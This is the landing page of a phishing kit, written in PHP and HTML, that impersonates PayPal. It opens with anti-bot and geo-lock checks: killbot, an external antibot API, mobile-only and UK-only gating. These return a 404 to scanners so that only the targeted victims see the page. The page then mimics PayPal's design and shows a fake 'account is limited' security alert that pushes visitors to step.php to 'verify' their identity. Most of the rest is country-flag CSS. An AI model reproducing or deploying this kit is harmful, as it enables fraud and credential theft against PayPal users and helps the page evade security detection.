<?php
include 'auth/conn.php';
include 'auth/connect.php';
include 'auth/blocker.php';
if($enable_killbot == 1){
  if(checkkillbot($killbot_key) == true){
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($mobile_only == 1){
  include 'auth/mobile_lock.php';
}
if($external_antibot == 1){
  if(checkBot($apikey) == true){
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($uk_lock == 1){
  if(onlyUK() == true){
  
  }else{
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
?>
<!DOCTYPE html>
<html lang="en" class=" desktop js "><!--<![endif]--><head>


  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Log in to your account</title><meta name="application-name" content="PayPal">
  
  <link rel="shortcut icon" href="file/pp_favicon_x.ico">
 <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
 <link rel="stylesheet" href="file/contextualLoginElementalUI.css"><style>/** method responsible for loading the background image set in CSS **/
@-webkit-keyframes rotation {
  from {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -webkit-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}
@-moz-keyframes rotation {
  from {
    -moz-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -moz-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}
@-o-keyframes rotation {
  from {
    -o-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -o-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}
@keyframes rotation {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(359deg);
  }
}
.country-selector .country {
  overflow: hidden;
  height: 24px;
  min-width: 32px;
  background: transparent url(file/sprite_countries_flag4.png) 5px 100px no-repeat;
  border: none;
  text-align: left;
}
.country-selector ul li {
  list-style: none;
  width: 19%;
  display: inline-block;
  line-height: 1.5rem;
  min-height: 3em;
}
.country-selector ul li a.country {
  padding: 3px 10px 0 35px;
  overflow: visible;
  line-height: 1.2em;
  display: block;
  height: 30px;
  min-width: 30px;
  color: #777;
  font-weight: 400;
  font-size: .9375rem;
}
.country-selector .priorityCountries {
  border-bottom: 1px solid #cfcfcf;
  margin-bottom: 20px;
}
.country-selector .zambia,
.country-selector .ZM {
  background-position: 5px 1px;
}
.country-selector .southafrica,
.country-selector .ZA {
  background-position: 5px -34px;
}
.country-selector .YE,
.country-selector .yemen {
  background-position: 5px -69px;
}
.country-selector .samoa,
.country-selector .WS {
  background-position: 5px -104px;
}
.country-selector .vanuatu,
.country-selector .VU {
  background-position: 5px -139px;
}
.country-selector .unitedstates,
.country-selector .US {
  background-position: 5px -383px;
}
.country-selector .taiwan,
.country-selector .TW {
  background-position: 5px -524px;
}
.country-selector .TR,
.country-selector .turkey {
  background-position: 5px -629px;
}
.country-selector .TH,
.country-selector .thailand {
  background-position: 5px -804px;
}
.country-selector .CH,
.country-selector .switzerland {
  background-position: 5px -944px;
}
.country-selector .AR,
.country-selector .argentina {
  background-position: 5px -6055px;
}
.country-selector .SK,
.country-selector .slovakia {
  background-position: 5px -1224px;
}
.country-selector .SG,
.country-selector .singapore {
  background-position: 5px -1294px;
}
.country-selector .SE,
.country-selector .sweden {
  background-position: 5px -1329px;
}
.country-selector .portugal,
.country-selector .PT {
  background-position: 5px -1679px;
}
.country-selector .PL,
.country-selector .poland {
  background-position: 5px -1714px;
}
.country-selector .newzealand,
.country-selector .NZ {
  background-position: 5px -1959px;
}
.country-selector .NO,
.country-selector .norway {
  background-position: 5px -2099px;
}
.country-selector .netherlands,
.country-selector .NL {
  background-position: 5px -2134px;
}
.country-selector .malaysia,
.country-selector .MY {
  background-position: 5px -2379px;
}
.country-selector .mexico,
.country-selector .MX {
  background-position: 5px -2414px;
}
.country-selector .martinique,
.country-selector .MQ {
  background-position: 5px -2659px;
}
.country-selector .LU,
.country-selector .luxembourg {
  background-position: 5px -2904px;
}
.country-selector .KR,
.country-selector .southkorea {
  background-position: 5px -3254px;
}
.country-selector .japan,
.country-selector .JP {
  background-position: 5px -3499px;
}
.country-selector .jamaica,
.country-selector .JM {
  background-position: 5px -3569px;
}
.country-selector .IT,
.country-selector .italy {
  background-position: 5px -3604px;
}
.country-selector .IL,
.country-selector .israel {
  background-position: 5px -3709px;
}
.country-selector .IE,
.country-selector .ireland {
  background-position: 5px -3744px;
}
.country-selector .ID,
.country-selector .indonesia {
  background-position: 5px -3779px;
}
.country-selector .HU,
.country-selector .hungary {
  background-position: 5px -3814px;
}
.country-selector .HK,
.country-selector .hongkong {
  background-position: 5px -3919px;
}
.country-selector .GR,
.country-selector .greece {
  background-position: 5px -4059px;
}
.country-selector .GB,
.country-selector .unitedkingdom {
  background-position: 5px -4304px;
}
.country-selector .FR,
.country-selector .france,
.country-selector .frenchguiana,
.country-selector .GF,
.country-selector .GP,
.country-selector .guadeloupe,
.country-selector .RE,
.country-selector .reunion {
  background-position: 5px -4374px;
}
.country-selector .FI,
.country-selector .finland {
  background-position: 5px -4549px;
}
.country-selector .ES,
.country-selector .spain {
  background-position: 5px -4618px;
}
.country-selector .EC,
.country-selector .ecuador {
  background-position: 5px -4724px;
}
.country-selector .algeria,
.country-selector .DZ {
  background-position: 5px -4759px;
}
.country-selector .denmark,
.country-selector .DK {
  background-position: 5px -4864px;
}
.country-selector .DE,
.country-selector .germany {
  background-position: 5px -4934px;
}
.country-selector .EG,
.country-selector .egypt {
  background-position: 5px -69px;
}
.country-selector .CZ,
.country-selector .czechrepublic {
  background-position: 5px -4969px;
}
.country-selector .C2,
.country-selector .china,
.country-selector .CN {
  background-position: 5px -5144px;
}
.country-selector .CA,
.country-selector .canada {
  background-position: 5px -5319px;
}
.country-selector .botswana,
.country-selector .BW {
  background-position: 5px -5389px;
}
.country-selector .belize,
.country-selector .BZ {
  background-position: 5px -5354px;
}
.country-selector .bahamas,
.country-selector .BS {
  background-position: 5px -5459px;
}
.country-selector .BR,
.country-selector .brazil {
  background-position: 5px -5494px;
}
.country-selector .bermuda,
.country-selector .BM {
  background-position: 5px -5599px;
}
.country-selector .bahrain,
.country-selector .BH {
  background-position: 5px -5704px;
}
.country-selector .BE,
.country-selector .belgium {
  background-position: 5px -5809px;
}
.country-selector .barbados,
.country-selector .BB {
  background-position: 5px -5844px;
}
.country-selector .BA,
.country-selector .bosniaandherzegovina {
  background-position: 5px -5879px;
}
.country-selector .BF,
.country-selector .burkinafaso {
  background-position: 5px -5773px;
}
.country-selector .AU,
.country-selector .australia {
  background-position: 5px -5984px;
}
.country-selector .AT,
.country-selector .austria {
  background-position: 5px -6019px;
}
.country-selector .AL,
.country-selector .albania {
  background-position: 5px -6194px;
}
.country-selector .AG,
.country-selector .antiguaandbarbuda {
  background-position: 5px -6264px;
}
.country-selector .AD,
.country-selector .andorra {
  background-position: 5px -6334px;
}
.country-selector .BG,
.country-selector .bulgaria {
  background-position: 5px -5739px;
}
.country-selector .cambodia,
.country-selector .KH {
  background-position: 5px -3397px;
}
.country-selector .caymanislands,
.country-selector .KY {
  background-position: 5px -4479px;
}
.country-selector .CO,
.country-selector .colombia {
  background-position: 5px -5109px;
}
.country-selector .croatia,
.country-selector .HR {
  background-position: 5px -3849px;
}
.country-selector .CY,
.country-selector .cyprus {
  background-position: 5px -5004px;
}
.country-selector .DM,
.country-selector .dominica {
  background-position: 5px -4829px;
}
.country-selector .DO,
.country-selector .dominicanrepublic {
  background-position: 5px -4794px;
}
.country-selector .elsalvador,
.country-selector .SV {
  background-position: 5px -979px;
}
.country-selector .ER,
.country-selector .eritrea {
  background-position: 5px -4655px;
}
.country-selector .EE,
.country-selector .estonia {
  background-position: 5px -4689px;
}
.country-selector .ET,
.country-selector .ethiopia {
  background-position: 5px -4587px;
}
.country-selector .faroeislands,
.country-selector .FO {
  background-position: 5px -4409px;
}
.country-selector .fiji,
.country-selector .FJ {
  background-position: 5px -4514px;
}
.country-selector .frenchpolynesia,
.country-selector .PF {
  background-position: 5px -1819px;
}
.country-selector .GI,
.country-selector .gibraltar {
  background-position: 5px -4199px;
}
.country-selector .GL,
.country-selector .greenland {
  background-position: 5px -4164px;
}
.country-selector .GD,
.country-selector .grenada {
  background-position: 5px -4269px;
}
.country-selector .GT,
.country-selector .guatemala {
  background-position: 5px -4024px;
}
.country-selector .HN,
.country-selector .honduras {
  background-position: 5px -3884px;
}
.country-selector .iceland,
.country-selector .IS {
  background-position: 5px -3639px;
}
.country-selector .JO,
.country-selector .jordan {
  background-position: 5px -3534px;
}
.country-selector .KE,
.country-selector .kenya {
  background-position: 5px -3464px;
}
.country-selector .kuwait,
.country-selector .KW {
  background-position: 5px -3219px;
}
.country-selector .latvia,
.country-selector .LV {
  background-position: 5px -2869px;
}
.country-selector .lesotho,
.country-selector .LS {
  background-position: 5px -2974px;
}
.country-selector .LI,
.country-selector .liechtenstein {
  background-position: 5px -3044px;
}
.country-selector .lithuania,
.country-selector .LT {
  background-position: 5px -2939px;
}
.country-selector .malawi,
.country-selector .MW {
  background-position: 5px -2449px;
}
.country-selector .malta,
.country-selector .MT {
  background-position: 5px -2554px;
}
.country-selector .MN,
.country-selector .mongolia {
  background-position: 5px -6369px;
}
.country-selector .MA,
.country-selector .morocco {
  background-position: 5px -2834px;
}
.country-selector .mozambique,
.country-selector .MZ {
  background-position: 5px -2344px;
}
.country-selector .NC,
.country-selector .newcaledonia {
  background-position: 5px -2274px;
}
.country-selector .OM,
.country-selector .oman {
  background-position: 5px -1924px;
}
.country-selector .palau,
.country-selector .PW {
  background-position: 5px -1644px;
}
.country-selector .PA,
.country-selector .panama {
  background-position: 5px -1889px;
}
.country-selector .PH,
.country-selector .philippines {
  background-position: 5px -1749px;
}
.country-selector .pitcairnislands,
.country-selector .PN {
  background-position: 5px -6229px;
}
.country-selector .QA,
.country-selector .qatar {
  background-position: 5px -5704px;
}
.country-selector .RO,
.country-selector .romania {
  background-position: 5px -1539px;
}
.country-selector .RU,
.country-selector .russia {
  background-position: 5px -1503px;
}
.country-selector .RW,
.country-selector .rwanda {
  background-position: 5px -6439px;
}
.country-selector .saotomeandprincipe,
.country-selector .ST {
  background-position: 5px -1014px;
}
.country-selector .KN,
.country-selector .saintkittsandnevis {
  background-position: 5px -3289px;
}
.country-selector .sainthelena,
.country-selector .SH {
  background-position: 5px -909px;
}
.country-selector .saintvincentandthegrenadines,
.country-selector .VC {
  background-position: 5px -278px;
}
.country-selector .LC,
.country-selector .saintlucia {
  background-position: 5px -3079px;
}
.country-selector .PM,
.country-selector .saintpierreandmiquelon {
  background-position: 5px -6824px;
}
.country-selector .sanmarino,
.country-selector .SM {
  background-position: 5px -1154px;
}
.country-selector .SA,
.country-selector .saudiarabia {
  background-position: 5px -1434px;
}
.country-selector .SC,
.country-selector .seychelles {
  background-position: 5px -1364px;
}
.country-selector .SI,
.country-selector .slovenia {
  background-position: 5px -1259px;
}
.country-selector .tajikistan,
.country-selector .TJ {
  background-position: 5px -769px;
}
.country-selector .trinidadandtobago,
.country-selector .TT {
  background-position: 5px -594px;
}
.country-selector .AE,
.country-selector .unitedarabemirates {
  background-position: 5px -6299px;
}
.country-selector .uruguay,
.country-selector .UY {
  background-position: 5px -351px;
}
.country-selector .VE,
.country-selector .venezuela {
  background-position: 5px -244px;
}
.country-selector .IN,
.country-selector .india {
  background-position: 5px -3674px;
}
.country-selector .vietnam,
.country-selector .VN {
  background-position: 5px -174px;
}
.country-selector .angola,
.country-selector .AO {
  background-position: 5px -6089px;
}
.country-selector .AI,
.country-selector .anguilla {
  background-position: 5px -6229px;
}
.country-selector .AM,
.country-selector .armenia {
  background-position: 5px -6159px;
}
.country-selector .aruba,
.country-selector .AW {
  background-position: 5px -5949px;
}
.country-selector .AZ,
.country-selector .azerbaijanrepublic {
  background-position: 5px -5914px;
}
.country-selector .benin,
.country-selector .BJ {
  background-position: 5px -5634px;
}
.country-selector .bhutan,
.country-selector .BT {
  background-position: 5px -5424px;
}
.country-selector .BO,
.country-selector .bolivia {
  background-position: 5px -5529px;
}
.country-selector .BN,
.country-selector .brunei {
  background-position: 5px -5564px;
}
.country-selector .BI,
.country-selector .burundi {
  background-position: 5px -5669px;
}
.country-selector .capeverde,
.country-selector .CV {
  background-position: 5px -5039px;
}
.country-selector .chad,
.country-selector .TD {
  background-position: 5px -1539px;
}
.country-selector .chile,
.country-selector .CL {
  background-position: 5px -5179px;
}
.country-selector .comoros,
.country-selector .KM {
  background-position: 5px -3324px;
}
.country-selector .CK,
.country-selector .cookislands {
  background-position: 5px -5214px;
}
.country-selector .costarica,
.country-selector .CR {
  background-position: 5px -5074px;
}
.country-selector .CD,
.country-selector .democraticrepublicofthecongo {
  background-position: 5px -5284px;
}
.country-selector .DJ,
.country-selector .djibouti {
  background-position: 5px -4899px;
}
.country-selector .falklandislands,
.country-selector .FK {
  background-position: 5px -6229px;
}
.country-selector .GA,
.country-selector .gabonrepublic {
  background-position: 5px -4339px;
}
.country-selector .gambia,
.country-selector .GM {
  background-position: 5px -4129px;
}
.country-selector .GE,
.country-selector .georgia {
  background-position: 5px -6652px;
}
.country-selector .GN,
.country-selector .guinea,
.country-selector .guineabissau,
.country-selector .GW {
  background-position: 5px -3989px;
}
.country-selector .guyana,
.country-selector .GY {
  background-position: 5px -3954px;
}
.country-selector .kazakhstan,
.country-selector .KZ {
  background-position: 5px -3149px;
}
.country-selector .KI,
.country-selector .kiribati {
  background-position: 5px -3359px;
}
.country-selector .KG,
.country-selector .kyrgyzstan {
  background-position: 5px -3429px;
}
.country-selector .LA,
.country-selector .laos {
  background-position: 5px -3114px;
}
.country-selector .madagascar,
.country-selector .MG {
  background-position: 5px -2799px;
}
.country-selector .maldives,
.country-selector .MV {
  background-position: 5px -2484px;
}
.country-selector .mali,
.country-selector .ML {
  background-position: 5px -2729px;
}
.country-selector .marshallislands,
.country-selector .MH {
  background-position: 5px -2764px;
}
.country-selector .mauritania,
.country-selector .MR {
  background-position: 5px -2624px;
}
.country-selector .mauritius,
.country-selector .MU {
  background-position: 5px -2519px;
}
.country-selector .FM,
.country-selector .micronesia {
  background-position: 5px -4444px;
}
.country-selector .montserrat,
.country-selector .MS {
  background-position: 5px -2589px;
}
.country-selector .mayotte,
.country-selector .YT {
  background-position: 5px -6544px;
}
.country-selector .NA,
.country-selector .namibia {
  background-position: 5px -2309px;
}
.country-selector .nauru,
.country-selector .NR {
  background-position: 5px -2029px;
}
.country-selector .nepal,
.country-selector .NP {
  background-position: 5px -2064px;
}
.country-selector .AN,
.country-selector .netherlandsantilles {
  background-position: 5px -6124px;
}
.country-selector .NI,
.country-selector .nicaragua {
  background-position: 5px -2169px;
}
.country-selector .NE,
.country-selector .niger {
  background-position: 5px -2239px;
}
.country-selector .niue,
.country-selector .NU {
  background-position: 5px -1994px;
}
.country-selector .NF,
.country-selector .norfolkisland {
  background-position: 5px -2204px;
}
.country-selector .papuanewguinea,
.country-selector .PG {
  background-position: 5px -1784px;
}
.country-selector .PE,
.country-selector .peru {
  background-position: 5px -1854px;
}
.country-selector .CG,
.country-selector .republicofcongo {
  background-position: 5px -5284px;
}
.country-selector .senegal,
.country-selector .SN {
  background-position: 5px -1119px;
}
.country-selector .RS,
.country-selector .serbia {
  background-position: 5px -6718px;
}
.country-selector .sierraleone,
.country-selector .SL {
  background-position: 5px -1189px;
}
.country-selector .SB,
.country-selector .solomonislands {
  background-position: 5px -1399px;
}
.country-selector .SO,
.country-selector .somalia {
  background-position: 5px -1084px;
}
.country-selector .LK,
.country-selector .srilanka {
  background-position: 5px -3009px;
}
.country-selector .SH,
.country-selector .sthelena {
  background-position: 5px -909px;
}
.country-selector .SR,
.country-selector .suriname {
  background-position: 5px -1049px;
}
.country-selector .swaziland,
.country-selector .SZ {
  background-position: 5px -6509px;
}
.country-selector .SJ,
.country-selector .svalbardandjanmayen {
  background-position: 5px -2099px;
}
.country-selector .tanzania,
.country-selector .TZ {
  background-position: 5px -489px;
}
.country-selector .TG,
.country-selector .togo {
  background-position: 5px -839px;
}
.country-selector .TO,
.country-selector .tonga {
  background-position: 5px -664px;
}
.country-selector .TN,
.country-selector .tunisia {
  background-position: 5px -699px;
}
.country-selector .TM,
.country-selector .turkmenistan {
  background-position: 5px -734px;
}
.country-selector .TC,
.country-selector .turksandcaicos {
  background-position: 5px -909px;
}
.country-selector .tuvalu,
.country-selector .TV {
  background-position: 5px -559px;
}
.country-selector .UG,
.country-selector .uganda {
  background-position: 5px -419px;
}
.country-selector .UA,
.country-selector .ukraine {
  background-position: 5px -454px;
}
.country-selector .VA,
.country-selector .vaticancity {
  background-position: 5px -314px;
}
.country-selector .VG,
.country-selector .virginislands {
  background-position: 5px -209px;
}
.country-selector .wallisandfutuna,
.country-selector .WF {
  background-position: 5px -6792px;
}
.country-selector .ME,
.country-selector .montenegro {
  background-position: 5px -6859px;
}
.country-selector .macedonia,
.country-selector .MK {
  background-position: 5px -6894px;
}
.country-selector .MD,
.country-selector .moldova {
  background-position: 5px -6929px;
}
.country-selector .kosovo,
.country-selector .XK {
  background-position: 5px -6964px;
}
.country-selector .belarus,
.country-selector .BY {
  background-position: 5px -6999px;
}
.country-selector .MC,
.country-selector .monaco {
  background-position: 5px -7034px;
}
.country-selector .NG,
.country-selector .nigeria {
  background-position: 5px -7069px;
}
.country-selector .GH,
.country-selector .ghana {
  background-position: 5px -7104px;
}
.country-selector .CI,
.country-selector .cotedivoire {
  background-position: 5px -7139px;
}
.country-selector .cameroon,
.country-selector .CM {
  background-position: 5px -7174px;
}
.country-selector .zimbabwe,
.country-selector .ZW {
  background-position: 5px -7209px;
}
.country-selector .paraguay,
.country-selector .PY {
  background-position: 5px -7244px;
}
@media all and (max-width: 767px) {
  .country-selector ul li {
    display: block;
    width: 100%;
  }
  .priorityCountries span::before {
    font-size: 3em;
    float: right;
    padding-right: 10px;
  }
}
ul.priorityCountries li:first-child a:visited,
ul.priorityCountries li:first-child a:hover {
  text-decoration: none;
}
@media all and (min-width: 768px) {
  .priorityCountries span::before {
    content: none;
  }
}
.countryListModal {
  position: absolute;
  top: 100%;
  transition: all 0.3s ease-out;
  min-height: 100vh;
  min-width: 100vw;
  background: #ffffff;
  z-index: 999999;
  opacity: 1;
}
.countryListModal.transitionUp {
  top: 0;
}
.countryListModal .wrapper {
  margin: 0 auto;
  width: 70%;
}
@media all and (max-width: 767px) {
  .countryListModal .wrapper {
    width: 100%;
  }
}
.countryListModal .buttonHolder {
  min-height: 7rem;
  position: fixed;
  width: 70%;
}
.countryListModal .ghostElement {
  /* hides behind fixed button holder */
  height: 7rem;
}
.countryListModal .modalContent {
  padding-left: 10px;
}
@media all and (max-width: 767px) {
  .countryListModal .buttonHolder {
    min-height: 5rem;
    width: 100%;
  }
  .countryListModal .ghostElement {
    height: 5rem;
  }
  .countryListModal .closeModal::before {
    /* to align with the selector icon */
    padding-right: 20px;
  }
}
.countryListModal .closeModal {
  background: none;
  border: none;
  padding: 0 4px 0;
  float: right;
  color: #2c2e2f;
  cursor: pointer;
  height: 40px;
  font-size: 2em;
}
.countryListModal .paypalIcon {
  background: url(file/icon_PP_monogram_2x.png) center 14px no-repeat #ffffff;
  background-size: 20px;
}
.picker.country-selector {
  display: inline-block;
  vertical-align: middle;
  position: relative;
}
.picker.country-selector button {
  display: inline-block;
  margin-right: 30px;
  cursor: pointer;
}
.picker.country-selector button::after {
  content: '';
  position: absolute;
  bottom: 10px;
  height: 8px;
  width: 8px;
  left: 30px;
  margin: 8px 0 0 8px;
  border-color: #333;
  border-image: none;
  border-style: solid;
  border-width: 1px 1px 0 0;
  -webkit-transform: rotate(135deg);
  -moz-transform: rotate(135deg);
  -o-transform: rotate(135deg);
  -ms-transform: rotate(135deg);
  transform: rotate(135deg);
}
</style>
  

</head><body class="desktop"><div id="main" class="main" role="main">
  <section id="login" class="login  " data-role="page" data-title="Log in to your PayPal account"><div class=" corral"><div id="content" class="contentContainer activeContent contentContainerBordered"><header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p></header>
<img src="file/glyph_alert_critical_big-2x.png" alt="Paris" style="width:10%; display: block; margin-left: auto; margin-right: auto;">
    <h3 style="padding-bottom: 0%; text-align: center; font-size: 24px; font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif; font-weight: 400; font-variant: normal;">Security alert</h3><div id="loginContent" class=""><div id="loginSection" class="">
    <form action="step.php" method="post" id="basic-form" novalidate="novalidate">

<p id="" style="text-align: center; font-size: 500; font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;">Your account is limited</p>
<p id="" style="text-align: center; font-size: 500; font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;">Due to the conflicts we are having verifying some informations on your account, we have decided to place a temporary hold until you make some required actions and verify.</p>
<p id="" style="text-align: center; font-size: 500; font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;"> To restore your account, please click continue to update the information we have on file and verify your identity.</p>
     

      </div>


  


    </div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Continue</button></div>

    <small>Proceeding will prompt you to enter informations we need and will use to know if you are the owner of the information.</small>
</form>

<div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a><div class="bubble-tooltip hide" id="moreOptionsDropDown"><ul class="moreoptionsGroup"><li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a></li><li><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></li></ul></div></div><div id="tpdButtonContainer" class="signupContainer hide"><div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div><div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button></div></div></div></div></div></div></section><section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation – PayPal"><div class="corral"><div class="contentContainer contentContainerLean"><div id="pending" class="verificationSubSection"><h1 class="headerText">Open the PayPal app</h1><p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p><p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p><div class="notifications"></div><div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span></div>
      <div class="mobileNotification"><p class="pin"></p><div class="mobileScreen"><img src="file/icon-PN-check.png" alt="phone"></div></div><p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="#" class="inlineLink scTrack:try-password" pa-marked="1">Use password instead</a></p><p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="#" id="resend" pa-marked="1">Resend</a><span class="sentMessage hide">Sent</span></p></div><div id="expired" class="hide verificationSubSection"><header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p></header><h1 class="headerText headerTextWarning">We're sorry, we couldn't confirm it's you</h1><p class="slimP">We didn't receive a response so we were unable confirm your identity.</p><button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Try Again</button></div><div id="denied" class="denied hide verificationSubSection"><img alt="" src="file/glyph_alert_critical_big-2x.png" class="deniedCaution"><h1 class="headerText">We're sorry, we couldn't confirm it's you</h1><p>Need a hand? <a href="#" class="inlineLink scTrack:help" pa-marked="1">We can help</a>.</p></div></div></div></section>

<br>
<br>
<br>
<br>

      <footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li><a target="_blank" href="#" pa-marked="1">Contact us</a></li><li><a target="_blank" href="#" pa-marked="1">Privacy</a></li><li><a target="_blank" href="#" pa-marked="1">Legal</a></li><li><a target="_blank" href="#" pa-marked="1">Worldwide</a></li></ul></div></footer></div><!-- /build --><!-- /build --><script nonce="">var PAYPAL = PAYPAL || {};PAYPAL.ulData = PAYPAL.ulData || {};PAYPAL.ulData.incontextData = {"version": "","noBridge": "","env": "","icstage": "","targetCancelUrl": "","paymentAction": "","paymentToken": "","merchantID": ""};</script><!-- build:js inline --><!-- build:[src] js/ --><script nonce="" src="file/signin-split.js.download"></script><!-- /build --><!-- /build --><!-- build:js inline --><!-- build:[src] js/ -->



   </body></html>